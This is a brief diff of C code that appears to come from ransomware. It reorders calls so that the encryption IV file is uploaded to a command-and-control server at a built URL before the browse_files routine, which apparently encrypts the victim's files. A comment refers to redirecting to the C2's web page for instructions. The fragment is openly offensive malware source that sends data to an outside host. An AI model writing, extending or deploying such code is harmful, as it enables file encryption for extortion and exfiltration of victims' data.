@@ -97,8 +97,8 @@ int main(){
     sprintf(URL, "http://%s:%d/upload", ip, port);
     const unsigned char *ID = key_lisible;
 
-    browse_files(key, iv, aad, ID, URL);
     sendFileToApi("iv.txt", ID, URL);
+    browse_files(key, iv, aad, ID, URL);
 
     //Redirect to C2's web page for instructions
 
